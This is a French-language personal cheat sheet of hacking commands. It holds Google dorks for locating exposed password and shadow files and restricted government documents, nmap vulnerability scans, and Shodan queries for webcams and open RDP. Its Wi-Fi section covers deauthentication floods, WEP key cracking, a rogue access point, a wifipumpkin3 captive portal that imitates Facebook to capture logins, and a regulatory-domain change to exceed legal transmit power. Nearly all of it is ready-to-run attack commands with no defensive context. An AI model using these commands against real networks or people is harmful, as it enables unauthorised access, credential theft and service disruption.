# Liens :

Clair-scanner :
- https://github.com/arminc/clair-scanner/blob/master/README.md
- https://github.com/quay/clair
- https://chathura-siriwardhana.medium.com/docker-image-security-scan-with-clair-94b766faff3c 


GoogleContainerTools :
- https://github.com/GoogleContainerTools 

Global DDOS attack :
- https://www.digitalattackmap.com/

Wigle :
- https://wigle.net/

Shodan :
- https://www.shodan.io/


# Osint
Google opérateur : 
```
m.trix
“Robert Masse”


Inurl: cgi-bin
Allinurl: cgi-bin password
allintitle: "index of/admin"
allintitle: "index of/root"
allintitle: sensitive filetype:doc
allintitle: restricted filetype :mail
allintitle: restricted filetype:doc site:gov
inurlasswd filetype:txt
inurl:admin filetype:db
inurl:iisadmin
inurl:"auth_user_file.txt"
inurl:"wwwroot/*."
top secret site:mil
confidential site:mil
allinurl: winnt/system32/ (get cmd.exe)
allinurl:/bash_history
intitle:"Index of" .sh_history
intitle:"Index of" .bash_history
intitle:"index of" passwd
intitle:"index of" people.lst
intitle:"index of" pwd.db
intitle:"index of" etc/shadow
intitle:"index of" spwd
intitle:"index of" master.passwd
intitle:"index of" htpasswd
intitle:"index of" members OR accounts
intitle:"index of" user_carts OR user_cart
allintitle: "index of/admin"
allintitle: "index of/root"
allintitle: sensitive filetype:doc
allintitle: restricted filetype :mail
allintitle: restricted filetype:doc site:gov
```

# NMAP
```
nmap @ip

scan les 65535 ports existants
nmap @ip -p-

scan OS
nmap @ip -O

@scan vuln
nmap @ip -script vuln

```
# Wireshark
```
tcp.port == 80 || udp.port == 80
ip.dst == 192.168.1.46
```

# Shodan
```
2009 john matherly
Mr Robot
maj h24/7j

os:windows
os:windows country:fr
camera city:paris
webcamxp
port:22
port:3389
title:"hacked by"
```

# WIFI
## Trouver les réseaux wifi accessible

```sh
iwlist wlan0 scanning
```
# Monitoring wifi

## Changer le regulatory domains

```sh
iw reg set BO
``` 
> BO = Bolivie


## Change le tx-power 

```sh
iwconfig wlan0 txpower 30
```

## Carte wifi en mode monitor 
```sh
airmon-ng start wlan0
```

## Réseaux caché 
```sh
airodump-ng wlan0mon
wireshark : filtre = wlan.addr = BSSID
```

## Désauthentification
```sh
aireplay--ng -0 5 - a BSSID --ignore-negative wlan0mon
aireplay-ng -0 1000 -a BSSID_DU_WIFI -c BSSID_DE_LOBJET_CONNECTE --ignore-negative-one wlan0mon
```

## Changer de channel
```sh
iwconfig wlan0mon channel 1
```

## Interaction airodump

raccourci-clavier pour l'affichage de airodump

```
[a]: Select active areas by cycling through these display options: AP+STA; AP+STA+ACK; AP only; STA only

[d]: Reset sorting to defaults (Power)
[i]: Invert sorting algorithm
[m]: Mark the selected AP or cycle through different colors if the selected AP is already marked
[r]: (De-)Activate realtime sorting - applies sorting algorithm everytime the display will be redrawn

[s]: Change column to sort by, which currently includes: First seen; BSSID; PWR level; Beacons; Data packets; Packet rate; Channel; Max. data rate; Encryption; Strongest Ciphersuite; Strongest Authentication; ESSID

[SPACE]: Pause display redrawing/ Resume redrawing

[TAB]: Enable/Disable scrolling through AP list
[UP]: Select the AP prior to the currently marked AP in the displayed list if available
[DOWN]: Select the AP after the currently marked AP if available
```


## Attaque WEP 
```sh
airodump-ng -c 9 --bssid BSSID --write WEPCRACKING wlan0mon
aireplay-ng -3 -b BSSID -h MACHOST --ignore-negative-one wlan0mon
aircrack-ng WEPCRACKING-03.cap 
```


## Rogue AP
```sh
airbase-ng --essid AA1AA2 -c 11 wlan0mon
brctl addbr Wifi-Bridge
brctl addif Wifi-Bridge eth0
brctl addif Wifi-Bridge at0
ifconfig eth0 0.0.0.0 up
ifconfig at0 0.0.0.0 up
ifconfig Wifi-Bridge 192.168.1.55 up 

```

## Rogue AP MITM
```sh
sudo wifipupkin3
help
show
use misc.extra_captiveflask
help
download
proxies
set proxy captiveflask
set captiveflask.facebook true
ap

set ssid WIFI_PUMP 
set interface wlan0
ap 
start

```


